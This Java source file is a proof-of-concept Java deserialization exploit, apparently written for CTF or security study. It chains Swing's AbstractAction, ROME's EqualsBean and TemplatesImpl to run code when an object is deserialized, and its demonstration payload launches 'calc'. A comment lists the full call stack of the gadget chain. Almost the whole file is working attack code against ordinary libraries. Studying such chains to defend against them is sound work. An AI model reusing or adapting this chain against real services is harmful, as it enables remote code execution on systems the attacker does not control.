package com.javasec.pocs.rome;

import com.fasterxml.jackson.databind.node.POJONode;
import com.javasec.utils.SerializeUtils;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.sun.syndication.feed.impl.EqualsBean;

import javax.swing.*;
import javax.swing.event.SwingPropertyChangeSupport;
import javax.swing.text.StyledEditorKit;
import javax.xml.transform.Templates;
import java.lang.reflect.Field;

/**
 * -javaagent:E:\CTFLearning\Java\JavaSec\AbstractActionAgent.jar
 * newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * beanEquals:146, EqualsBean (com.sun.syndication.feed.impl)
 * equals:103, EqualsBean (com.sun.syndication.feed.impl)
 * firePropertyChange:273, AbstractAction (javax.swing)
 * putValue:211, AbstractAction (javax.swing)
 * readObject:364, AbstractAction (javax.swing)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeReadObject:1058, ObjectStreamClass (java.io)
 * readSerialData:1900, ObjectInputStream (java.io)
 * readOrdinaryObject:1801, ObjectInputStream (java.io)
 * readObject0:1351, ObjectInputStream (java.io)
 * readObject:371, ObjectInputStream (java.io)
 * base64deserial:48, SerializeUtils (com.javasec.utils)
 * main:36, AbstarctactionC (com.javasec.pocs.rome)
 */
public class AbstarctactionC {
    public static void main(String[] args) throws Exception{
        Templates templates = SerializeUtils.getTemplate("calc");
        EqualsBean equalsBean = new EqualsBean(String.class, "pop");
        StyledEditorKit.AlignmentAction action = SerializeUtils.createWithoutConstructor(StyledEditorKit.AlignmentAction.class);
        SerializeUtils.setFieldValue(action, "changeSupport", new SwingPropertyChangeSupport(""));
        action.putValue("p1", "");
        action.putValue("p2", "");
        Field tablefield = AbstractAction.class.getDeclaredField("arrayTable");
        tablefield.setAccessible(true);
        Object atable = tablefield.get(action);
        Field tablefield1 = atable.getClass().getDeclaredField("table");
        tablefield1.setAccessible(true);
        Object[] table1 = (Object[])tablefield1.get(atable);
        table1[1] = equalsBean;
        table1[3] = templates;
        tablefield1.set(atable, table1);
        SerializeUtils.setFieldValue(equalsBean, "_beanClass", Templates.class);
        SerializeUtils.setFieldValue(equalsBean, "_obj", templates);
        SerializeUtils.base64deserial(SerializeUtils.base64serial(action));
    }
}
